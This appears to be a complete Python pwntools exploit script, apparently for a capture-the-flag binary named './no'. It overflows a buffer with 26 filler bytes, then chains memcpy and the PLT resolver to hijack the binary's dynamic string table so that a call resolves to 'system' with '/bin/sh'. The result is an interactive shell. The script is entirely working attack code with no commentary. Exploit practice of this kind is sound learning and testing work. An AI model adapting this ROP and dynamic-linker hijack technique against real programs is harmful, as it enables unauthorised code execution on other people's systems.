from pwn import * 
context.log_level='critical'
dynamic=0x080496c0
dynstr_addr=dynamic+0x8*8+0x4
p4r=0x08048518
p3r=0x08048519
p2r=0x0804851a
pr=0x0804851b
ret=0x0804835f
dynstr=0x804820c
plt0=0x80482d0
read=0x80482e0
memcpy=0x80482f0
bss=0x8049800
data_addr=bss+1024

rop=flat(
memcpy,p3r,dynstr_addr,data_addr,4,
plt0,0x8,
memcpy,0xdeadbeef,data_addr+0xc
)
data=flat(
data_addr+4-(0x804822b-0x804820c),
"system\x00\x00",
"/bin/sh\0"
)
payload=("A"*26+rop).ljust(1024,'\0')+data
p=process("./no")
if False:
	gdb.attach(p,'''
	b *0x8048483
	c
	''')
p.sendline(payload)
p.interactive();
